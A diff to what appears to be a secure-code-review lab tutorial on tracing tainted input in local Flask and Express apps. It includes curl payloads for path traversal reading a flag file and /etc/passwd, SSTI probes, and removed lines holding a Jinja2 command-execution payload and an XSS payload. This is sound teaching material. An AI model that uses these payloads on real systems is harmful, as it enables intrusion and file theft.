@@ -126,6 +126,16 @@ exploitable.** But note where the fix lives: at the *caller*. Add a second calle
 `int()` and the bug is back. We'll come back to this in step 4.
 
 <details>
+<summary>hints (one nudge per flow, try these before the answers)</summary>
+
+- **2**: the sink is in `utils.py`. What's the function wrapping it called? Grep that name.
+- **3**: `os.path.join("docs", "../../x")` — what does that evaluate to? Try it in a REPL.
+- **4**: no hops. Look at what's *inside* the string passed to the sink. Is the user's input the data, or the code?
+- **5**: no hops either. Is there anything checking the scheme or the host before the request goes out?
+
+</details>
+
+<details>
 <summary>answers</summary>
 
 | # | Hops back | Source | Sanitizer? |
@@ -145,6 +155,9 @@ A traced path is a *candidate*. It's a bug when a payload survives every hop and
 something at the sink. Half your candidates die here in real life. That's normal.
 
 Confirm each one. Start with a harmless probe, then escalate.
+
+Short on time? `./check.sh` fires every payload below and prints PASS/FAIL. Use it to confirm
+after you've done at least one by hand.
 
 ### Flow 1: SQLi
 
@@ -194,28 +207,23 @@ curl -s "http://localhost:5000/docs?name=..%2F..%2Fsecret%2Fflag.txt"
 
 `DOCS_DIR` is `/app/flask_app/docs`. Two `..` gets you to `/app`. Try `/etc/passwd` too.
 
-### Flow 4: SSTI (Flask) / XSS (Express)
+### Flow 4: SSTI
 
-Flask probe. If it renders `49`, the template engine evaluated your input:
+Probe. If it renders `49`, the template engine evaluated your input:
 
 ```bash
 curl -s "http://localhost:5000/hello?name={{7*7}}"
 ```
 
-Escalate to RCE:
+Express uses EJS, different syntax, same bug:
 
 ```bash
-curl -s "http://localhost:5000/hello?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+curl -s "http://localhost:3000/hello?name=<%25=7*7%25>"
 ```
 
-Express has no template engine here, so it's "just" reflected XSS. Open in a browser:
-
-```
-http://localhost:3000/hello?name=<img src=x onerror=alert(document.domain)>
-```
-
-Same source, same shape of sink (user string into output), different bug class. The *sink
-type* decides the class, not the source.
+Both engines can reach the host language from a template. Escalating to code execution is
+your exercise: search "jinja2 SSTI" / "ejs SSTI" payloads, try them, see what each engine
+exposes. The point for now: the user string *is* the template, not data inside it.
 
 ### Flow 5: SSRF
 
